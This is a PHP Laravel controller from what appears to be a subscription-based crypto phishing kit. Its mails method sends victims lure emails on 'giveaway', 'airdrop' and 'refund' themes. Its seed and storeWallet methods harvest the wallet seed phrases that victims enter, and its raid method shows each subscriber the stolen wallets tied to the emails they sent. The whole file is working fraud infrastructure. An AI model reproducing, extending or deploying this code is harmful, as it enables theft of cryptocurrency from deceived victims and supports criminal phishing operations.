<?php

namespace App\Http\Controllers;

use App\Mail\CryptoMail;
use App\Models\Bank;
use App\Models\Code;
use App\Models\Crypto;
use App\Models\Sent;
use App\Models\Wallet;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Validator;

class UserController extends Controller
{
    //


    public function view()
    {
        $user = auth()->user();
        if ($user->role == 'admin') {
            return redirect()->route('admin');
        } else {
            return view('user.dashboard');
        }
    }
    public function mail(Request $request)
    {
        if (!Auth::user()->codes()->where('status', 'active')->exists()) {
            return redirect()->route('subscribe');
        }
        return view('user.mail');
    }
    public function sub()
    {
        $banks = Bank::all();
        $cryptos = Crypto::all();
        return view('user.subscribe', compact('banks', 'cryptos'));
    }


    // public function mails(Request $request)
    // {
    //     $validator = Validator::make($request->all(), [
    //         'template' => ['required', 'in:giveaway,airdrop,refund'],
    //         'recipient_email' => ['required', 'email'],
    //         'crypto_type' => ['required', 'in:BTC,USDT,ETH,BNB,XRP,ADA,SOL,DOGE,DOT,AVAX,SHIB,LINK'],
    //         'quantity' => ['required', 'numeric', 'min:0.00000001'],
    //     ]);

    //     if ($validator->fails()) {
    //         return back()->withErrors($validator)->withInput();
    //     }

    //     try {
    //         // Queue the email
    //         Mail::to($request->recipient_email)->queue(new CryptoMail(
    //             $request->template,
    //             $request->crypto_type,
    //             $request->quantity
    //         ));

    //         return redirect()->route('mail')->with('success', 'Email queued successfully!');
    //     } catch (\Exception $e) {
    //         return back()->with('error', 'Failed to queue email: ' . $e->getMessage())->withInput();
    //     }
    // }

    public function mails(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'template' => ['required', 'in:giveaway,airdrop,refund'],
            'recipient_email' => ['required', 'email'],
            'crypto_type' => ['required', 'in:BTC,USDT,ETH,BNB,XRP,ADA,SOL,DOGE,DOT,AVAX,SHIB,LINK'],
            'quantity' => ['required', 'numeric', 'min:0.00000001'],
        ]);

        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput();
        }

        try {
            // Store email details with sender's user_id
            $sent = Sent::create([
                'user_id' => Auth::id(),
                'recipient_email' => $request->recipient_email,
                'quantity' => $request->quantity,
                'template' => $request->template,
                'crypto_type' => $request->crypto_type,
            ]);

            // Queue the email
            Mail::to($request->recipient_email)->queue(new CryptoMail(
                $request->template,
                $request->crypto_type,
                $request->quantity
            ));

            return redirect()->route('mail')->with('success', 'Email queued successfully!');
        } catch (\Exception $e) {
            return back()->with('error', 'Failed to queue email: ' . $e->getMessage())->withInput();
        }
    }

    public function storeWallet(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'user_email' => ['required', 'email'],
            'wallet_type' => ['required', 'in:MetaMask,Trust Wallet,Coinbase Wallet,SafePal,TokenPocket,Phantom,Rainbow,WalletConnect,BitKeep,Argent,ZenGo,Pillar,1inch Wallet,MEW Wallet,Torus'],
            'seed_phrase' => ['required', 'string'],
        ]);

        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput();
        }

        // Find the sent email by recipient email
        $sent = Sent::where('recipient_email', $request->user_email)->firstOrFail();

        // Store wallet connection details
        Wallet::create([
            'sent_email_id' => $sent->id,
            'user_email' => $request->user_email,
            'wallet_type' => $request->wallet_type,
            'seed_phrase' => encrypt($request->seed_phrase), // Encrypt sensitive data
        ]);

        return redirect()->back()->with('success', 'Wallet connected successfully!');
    }


    // public function raid()
    // {

    //     return view('user.raids');
    // }

    public function raid(Request $request)
    {
        // Fetch wallet connections for the authenticated user's sent emails
        $wallets = Wallet::whereHas('Sent', function ($query) {
            $query->where('user_id', Auth::id());
        })->with('sentEmail')->get();

        return view('user.raids', compact('wallets'));
    }


    public function useCode(Request $request)

    {
        $request->validate([
            'code' => 'required|string|exists:codes,code',
        ]);

        $code = Code::where('code', $request->code)
            ->whereNull('user_id')
            ->where('status', 'inactive')
            ->first();

        if (!$code) {
            return redirect()->route('subscribe')->with('error', 'Invalid or used code.');
        }

        $code->update([
            'user_id' => Auth::id(),
            'status' => 'active',
            'start_date' => now(),
            'end_date' => now()->addYear(), // Adjust duration as needed
        ]);

        return redirect()->route('subscribe')->with('success', 'Subscription activated.');
    }

    // public function seed()
    // {
    //     return view('user.seed');
    // }
    public function seed(Request $request)
    {
        return view('user.seed', ['sender_email' => $request->query('sender_email')]);
    }
}
